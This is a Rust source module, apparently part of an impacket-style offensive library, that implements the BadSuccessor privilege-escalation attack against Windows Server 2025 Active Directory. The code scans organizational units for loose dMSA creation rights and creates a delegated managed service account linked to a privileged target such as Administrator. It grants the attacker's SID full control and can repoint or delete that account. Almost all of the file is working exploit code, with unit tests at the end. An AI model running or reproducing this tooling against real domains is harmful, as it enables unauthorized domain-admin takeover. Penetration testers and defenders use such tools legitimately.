//! `dmsa`: Delegated Managed Service Account (dMSA) exploitation suite for Windows Server 2025.
//!
//! Implements BadSuccessor attack vectors targeting Active Directory domains with Windows Server 2025 DCs.
//! Covers OU vulnerability scanning for loose object creation rights, dMSA account provisioning with
//! `msDS-ManagedAccountPrecededByLink` targeting high-privileged accounts (Domain Admins / Domain Controllers),
//! and ACL configuration over `msDS-GroupMSAMembership`.

use crate::asn1::{
    filter_equality, AttributeModification, LdapAttribute, ModifyOperation, SearchScope,
};
use crate::client::LdapClient;
use crate::security_descriptor::{
    access_mask, ace_type, Ace, Acl, SecurityDescriptor,
};
use impacket_core::CoreError;
use impacket_ndr::{RpcSid, RpcUuid};
use std::io::{Read, Write};

/// Schema GUID for `msDS-DelegatedManagedServiceAccount` (`0feb936f-47b3-49f2-9386-1dedc2c23765`).
pub const DMSA_SCHEMA_GUID_STR: &str = "0feb936f-47b3-49f2-9386-1dedc2c23765";

/// Attribute name for predecessor account link.
pub const ATTR_MANAGED_ACCOUNT_PRECEDED_BY_LINK: &str = "msDS-ManagedAccountPrecededByLink";

/// Attribute name for group MSA membership security descriptor.
pub const ATTR_GROUP_MSA_MEMBERSHIP: &str = "msDS-GroupMSAMembership";

/// Represents an Organizational Unit identified as vulnerable to dMSA creation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VulnerableOu {
    pub ou_dn: String,
    pub principal_sid: String,
    pub principal_name: Option<String>,
    pub granted_rights: Vec<String>,
}

/// Builds the `msDS-GroupMSAMembership` security descriptor granting `principal_sid` access.
pub fn build_dmsa_membership_sd(principal_sid: &RpcSid) -> Result<Vec<u8>, CoreError> {
    let ace1 = Ace {
        ace_type: ace_type::ACCESS_ALLOWED_ACE_TYPE,
        ace_flags: 0x00,
        mask: 0x000F_01FF,
        sid: principal_sid.clone(),
        object_flags: None,
        object_type: None,
        inherited_object_type: None,
    };

    let ace2 = Ace {
        ace_type: ace_type::ACCESS_ALLOWED_ACE_TYPE,
        ace_flags: 0x00,
        mask: access_mask::GENERIC_ALL,
        sid: principal_sid.clone(),
        object_flags: None,
        object_type: None,
        inherited_object_type: None,
    };

    let dacl = Acl::new(vec![ace1, ace2]);
    let sd = SecurityDescriptor::new(
        Some(principal_sid.clone()),
        None,
        Some(dacl),
        None,
    );

    Ok(sd.to_bytes())
}

/// Checks if a SID belongs to a default high-privileged group that should be excluded from vulnerability reporting.
pub fn is_excluded_admin_sid(sid_str: &str, domain_sid_prefix: Option<&str>) -> bool {
    // S-1-5-32-544 (BUILTIN\Administrators), S-1-5-18 (NT AUTHORITY\SYSTEM)
    if sid_str == "S-1-5-32-544" || sid_str == "S-1-5-18" {
        return true;
    }

    if let Some(prefix) = domain_sid_prefix {
        if sid_str.starts_with(prefix) {
            // -512 (Domain Admins), -519 (Enterprise Admins), -500 (Administrator)
            if sid_str.ends_with("-512") || sid_str.ends_with("-519") || sid_str.ends_with("-500") {
                return true;
            }
        }
    }

    false
}

/// Resolves well-known SIDs to human-readable strings.
pub fn resolve_well_known_sid(sid_str: &str) -> Option<&'static str> {
    match sid_str {
        "S-1-1-0" => Some("Everyone"),
        "S-1-5-11" => Some("NT AUTHORITY\\Authenticated Users"),
        "S-1-5-32-544" => Some("BUILTIN\\Administrators"),
        "S-1-5-32-545" => Some("BUILTIN\\Users"),
        "S-1-5-32-546" => Some("BUILTIN\\Guests"),
        "S-1-5-18" => Some("NT AUTHORITY\\SYSTEM"),
        "S-1-5-19" => Some("NT AUTHORITY\\LOCAL SERVICE"),
        "S-1-5-20" => Some("NT AUTHORITY\\NETWORK SERVICE"),
        "S-1-3-0" => Some("CREATOR OWNER"),
        "S-1-3-1" => Some("CREATOR GROUP"),
        "S-1-5-9" => Some("NT AUTHORITY\\ENTERPRISE DOMAIN CONTROLLERS"),
        "S-1-5-10" => Some("NT AUTHORITY\\SELF"),
        _ => None,
    }
}

/// Constructs LDAP attributes for creating a new `msDS-DelegatedManagedServiceAccount` object.
pub fn build_dmsa_attributes(
    dmsa_name: &str,
    target_account_dn: &str,
    dns_hostname: &str,
    membership_sd_bytes: &[u8],
) -> Vec<LdapAttribute> {
    let clean_name = dmsa_name.trim_end_matches('$');
    let sam_name = format!("{}$", clean_name);

    vec![
        LdapAttribute {
            type_name: "objectClass".to_string(),
            values: vec![
                b"top".to_vec(),
                b"person".to_vec(),
                b"organizationalPerson".to_vec(),
                b"user".to_vec(),
                b"computer".to_vec(),
                b"msDS-GroupManagedServiceAccount".to_vec(),
                b"msDS-DelegatedManagedServiceAccount".to_vec(),
            ],
        },
        LdapAttribute {
            type_name: "cn".to_string(),
            values: vec![clean_name.as_bytes().to_vec()],
        },
        LdapAttribute {
            type_name: "sAMAccountName".to_string(),
            values: vec![sam_name.into_bytes()],
        },
        LdapAttribute {
            type_name: "dNSHostName".to_string(),
            values: vec![dns_hostname.as_bytes().to_vec()],
        },
        LdapAttribute {
            type_name: "userAccountControl".to_string(),
            values: vec![b"4096".to_vec()],
        },
        LdapAttribute {
            type_name: "msDS-ManagedPasswordInterval".to_string(),
            values: vec![b"30".to_vec()],
        },
        LdapAttribute {
            type_name: "msDS-DelegatedMSAState".to_string(),
            values: vec![b"2".to_vec()],
        },
        LdapAttribute {
            type_name: "msDS-SupportedEncryptionTypes".to_string(),
            values: vec![b"28".to_vec()],
        },
        LdapAttribute {
            type_name: "accountExpires".to_string(),
            values: vec![b"9223372036854775807".to_vec()],
        },
        LdapAttribute {
            type_name: ATTR_MANAGED_ACCOUNT_PRECEDED_BY_LINK.to_string(),
            values: vec![target_account_dn.as_bytes().to_vec()],
        },
        LdapAttribute {
            type_name: ATTR_GROUP_MSA_MEMBERSHIP.to_string(),
            values: vec![membership_sd_bytes.to_vec()],
        },
        LdapAttribute {
            type_name: "nTSecurityDescriptor".to_string(),
            values: vec![membership_sd_bytes.to_vec()],
        },
    ]
}

/// Scans Active Directory for Organizational Units allowing non-admin accounts to create dMSA objects.
pub fn scan_vulnerable_ous<S: Read + Write>(
    client: &mut LdapClient<S>,
    base_dn: &str,
    domain_sid: Option<&str>,
) -> Result<Vec<VulnerableOu>, CoreError> {
    let filter = filter_equality("objectClass", "organizationalUnit");
    let entries = client.search(
        base_dn,
        SearchScope::WholeSubtree,
        &filter,
        &["distinguishedName", "nTSecurityDescriptor"],
    )?;

    let mut results = Vec::new();
    let dmsa_guid = RpcUuid::parse(DMSA_SCHEMA_GUID_STR).ok();

    for entry in entries {
        let sd_bytes = match entry.get_first_raw("nTSecurityDescriptor") {
            Some(b) if !b.is_empty() => b,
            _ => continue,
        };

        let sd = match SecurityDescriptor::parse(sd_bytes) {
            Ok(s) => s,
            Err(_) => continue,
        };

        let dacl = match sd.dacl {
            Some(d) => d,
            None => continue,
        };

        for ace in &dacl.aces {
            if ace.ace_type != ace_type::ACCESS_ALLOWED_ACE_TYPE
                && ace.ace_type != ace_type::ACCESS_ALLOWED_OBJECT_ACE_TYPE
            {
                continue;
            }

            let sid_str = ace.sid.to_string();
            if is_excluded_admin_sid(&sid_str, domain_sid) {
                continue;
            }

            let mut granted = Vec::new();

            if (ace.mask & access_mask::GENERIC_ALL) == access_mask::GENERIC_ALL {
                granted.push("GenericAll".to_string());
            }
            if (ace.mask & access_mask::WRITE_DAC) == access_mask::WRITE_DAC {
                granted.push("WriteDacl".to_string());
            }
            if (ace.mask & access_mask::WRITE_OWNER) == access_mask::WRITE_OWNER {
                granted.push("WriteOwner".to_string());
            }

            let has_create_child = (ace.mask & access_mask::ADS_RIGHT_DS_CREATE_CHILD) != 0;
            if has_create_child {
                let allows_dmsa = match &ace.object_type {
                    None => true,
                    Some(guid) => {
                        (guid.data1 == 0 && guid.data2 == 0 && guid.data3 == 0 && guid.data4 == [0; 8])
                            || (dmsa_guid.is_some() && guid == dmsa_guid.as_ref().unwrap())
                    }
                };
                if allows_dmsa {
                    granted.push("CreateChild(dMSA)".to_string());
                }
            }

            if !granted.is_empty() {
                results.push(VulnerableOu {
                    ou_dn: entry.dn.clone(),
                    principal_sid: sid_str.clone(),
                    principal_name: resolve_well_known_sid(&sid_str).map(|s| s.to_string()),
                    granted_rights: granted,
                });
            }
        }
    }

    Ok(results)
}

/// Creates a new Delegated Managed Service Account (dMSA) in the target OU.
pub fn add_dmsa<S: Read + Write>(
    client: &mut LdapClient<S>,
    target_ou_dn: &str,
    dmsa_name: &str,
    target_account_dn: &str,
    principal_sid: &RpcSid,
    domain_fqdn: &str,
) -> Result<String, CoreError> {
    let clean_name = dmsa_name.trim_end_matches('$');
    let dmsa_dn = format!("CN={},{}", clean_name, target_ou_dn);
    let dns_host = if domain_fqdn.is_empty() {
        clean_name.to_string()
    } else {
        format!("{}.{}", clean_name.to_lowercase(), domain_fqdn.to_lowercase())
    };

    let sd_bytes = build_dmsa_membership_sd(principal_sid)?;
    let attrs = build_dmsa_attributes(clean_name, target_account_dn, &dns_host, &sd_bytes);

    client.add(&dmsa_dn, attrs)?;
    Ok(dmsa_dn)
}

/// Deletes an existing Delegated Managed Service Account (dMSA) from Active Directory.
pub fn delete_dmsa<S: Read + Write>(
    client: &mut LdapClient<S>,
    target_ou_dn: &str,
    dmsa_name: &str,
) -> Result<(), CoreError> {
    let clean_name = dmsa_name.trim_end_matches('$');
    let dmsa_dn = format!("CN={},{}", clean_name, target_ou_dn);
    client.delete(&dmsa_dn)
}

/// Modifies the `msDS-ManagedAccountPrecededByLink` predecessor link on an existing dMSA account.
pub fn modify_dmsa_predecessor<S: Read + Write>(
    client: &mut LdapClient<S>,
    dmsa_dn: &str,
    new_target_account_dn: &str,
) -> Result<(), CoreError> {
    let mods = vec![AttributeModification {
        operation: ModifyOperation::Replace,
        attribute: LdapAttribute {
            type_name: ATTR_MANAGED_ACCOUNT_PRECEDED_BY_LINK.to_string(),
            values: vec![new_target_account_dn.as_bytes().to_vec()],
        },
    }];
    client.modify(dmsa_dn, mods)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_dmsa_attributes_structure() {
        let sid = RpcSid::parse("S-1-5-21-12345678-12345678-12345678-1001").unwrap();
        let sd = build_dmsa_membership_sd(&sid).unwrap();
        let attrs = build_dmsa_attributes(
            "dmsa_svc",
            "CN=Administrator,CN=Users,DC=corp,DC=local",
            "dmsa_svc.corp.local",
            &sd,
        );

        assert!(attrs.iter().any(|a| a.type_name == "objectClass" && a.values.contains(&b"msDS-DelegatedManagedServiceAccount".to_vec())));
        assert!(attrs.iter().any(|a| a.type_name == "sAMAccountName" && a.values[0] == b"dmsa_svc$"));
        assert!(attrs.iter().any(|a| a.type_name == ATTR_MANAGED_ACCOUNT_PRECEDED_BY_LINK && a.values[0] == b"CN=Administrator,CN=Users,DC=corp,DC=local"));
        assert!(attrs.iter().any(|a| a.type_name == ATTR_GROUP_MSA_MEMBERSHIP));
    }

    #[test]
    fn test_is_excluded_admin_sid() {
        assert!(is_excluded_admin_sid("S-1-5-32-544", None));
        assert!(is_excluded_admin_sid("S-1-5-18", None));
        assert!(is_excluded_admin_sid("S-1-5-21-111-222-333-512", Some("S-1-5-21-111-222-333")));
        assert!(is_excluded_admin_sid("S-1-5-21-111-222-333-519", Some("S-1-5-21-111-222-333")));
        assert!(is_excluded_admin_sid("S-1-5-21-111-222-333-500", Some("S-1-5-21-111-222-333")));
        assert!(!is_excluded_admin_sid("S-1-5-21-111-222-333-1105", Some("S-1-5-21-111-222-333")));
        assert!(!is_excluded_admin_sid("S-1-5-11", None));
    }

    #[test]
    fn test_build_dmsa_membership_sd_roundtrip() {
        let sid = RpcSid::parse("S-1-5-21-999-888-777-1000").unwrap();
        let bytes = build_dmsa_membership_sd(&sid).unwrap();
        let parsed = SecurityDescriptor::parse(&bytes).unwrap();
        assert!(parsed.dacl.is_some());
        let dacl = parsed.dacl.unwrap();
        assert_eq!(dacl.aces.len(), 2);
        assert_eq!(dacl.aces[0].mask, 0x000F_01FF);
        assert_eq!(dacl.aces[1].mask, access_mask::GENERIC_ALL);
        assert_eq!(dacl.aces[0].sid, sid);
    }
}
